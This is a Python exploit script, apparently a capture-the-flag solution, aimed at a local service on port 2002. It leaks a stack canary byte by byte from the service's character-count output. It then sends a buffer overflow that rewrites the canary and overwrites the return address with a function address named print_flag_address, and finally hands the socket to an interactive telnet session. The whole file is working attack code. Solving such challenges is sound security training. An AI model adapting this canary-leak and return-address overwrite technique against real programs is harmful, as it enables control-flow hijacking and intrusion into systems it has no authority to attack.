#!/usr/bin/python3

import socket
import telnetlib
import pandas as pd


def read_output():
     output = ''
     while True:
        data = s.recv(2048).decode('ASCII')
        output += data
        if "analyzed" in data:
            return output

def parse_output(output):
    lines = output.strip().split('\n')
    column_names = lines[1].split()
    data = [tuple(line.split()) for line in lines[2:-1]]
    df = pd.DataFrame(data, columns=column_names)
    df["Code"] = df["Code"].astype(int)
    df["Count"] = df["Count"].astype(int)
    df = df[df['Count'] != 0]
    return df

def extract_current_canary_byte(df_current):
    for _, row in df_current.iterrows():
        # search for entry in data dict list
        entry = next((dict for dict in data_dict_list if dict['Code'] == row['Code']), None)
        if entry:
            if row['Count'] == entry['Count'] + 1:
                for to_update in data_dict_list:
                    if to_update["Code"] == row['Code']:
                        to_update["Count"] += 1
                        break
                return int(row['Code'])
        else:
            data_dict_list.append({'Code': row['Code'], 'Count': 1})
            return int(row['Code'])
    return 0

# constants
bytes_to_canary = 1032
canary = b''
print_flag_address = 0x0040188d
data_dict_list = [{"Code": 65, "Count": 1031}, {"Code": 10, "Count": 1}]

# start connection
s = socket.create_connection(('localhost', 2002))
print(s.recv(2048).decode('ASCII'))

# extract canary bytes by reading server response
for i in range(1,9):
    s.send(str(bytes_to_canary+i).encode() +  b"\n")
    s.recv(2048).decode('ASCII')
    s.send(b"A"*(bytes_to_canary-1) + b"\n")

    output = read_output()

    # search new byte in response
    df_current = parse_output(output)
    byte = extract_current_canary_byte(df_current)
    canary += (byte.to_bytes(1, 'little'))
    print(f"Canary byte found, byte is {byte}")

print(f"Canary extracted, has value {canary}")

# overwrite return address
s.send(str(bytes_to_canary+40).encode() +  b"\n")
s.recv(2048).decode('ASCII')
s.send(b"A"*(bytes_to_canary) + canary + b"A"*24 + print_flag_address.to_bytes(8, 'little'))

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
